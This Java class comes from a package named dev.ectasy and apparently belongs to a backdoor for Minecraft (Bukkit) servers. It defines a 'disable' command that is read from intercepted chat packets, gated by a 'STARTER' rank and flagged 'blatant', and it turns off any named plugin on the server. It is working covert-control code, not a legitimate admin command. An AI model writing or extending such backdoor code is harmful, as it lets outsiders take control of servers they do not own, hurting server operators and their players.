package dev.ectasy.impl.commands.starter;

import com.github.retrooper.packetevents.event.PacketReceiveEvent;
import com.github.retrooper.packetevents.wrapper.play.client.WrapperPlayClientChatMessage;
import dev.ectasy.api.commands.AbstractCommand;
import dev.ectasy.api.commands.CommandInfo;
import dev.ectasy.api.data.Rank;
import dev.ectasy.api.data.User;
import org.bukkit.Bukkit;
import org.bukkit.plugin.Plugin;

@CommandInfo(
        name = "disable",
        description = "Disables a plugin.",
        rank = Rank.STARTER,
        blatant = true
)
public class CommandDisable extends AbstractCommand {
    @Override
    public void execute(User user, PacketReceiveEvent event, WrapperPlayClientChatMessage packet, String[] args) {
        if(args.length < 1){
            user.sendMessage("Usage: disable <plugin>");
            return;
        }

        Plugin plugin = Bukkit.getPluginManager().getPlugin(args[0]);
        if(plugin == null){
            user.sendMessage("The plugin " + user.getMainColor() + args[0] + user.getSecondaryColor() + " has not been found.");
            return;
        }

        Bukkit.getPluginManager().disablePlugin(plugin);
        user.sendMessage("The plugin " + user.getMainColor() + plugin.getName() + user.getSecondaryColor() + " has been disabled.");




    }
}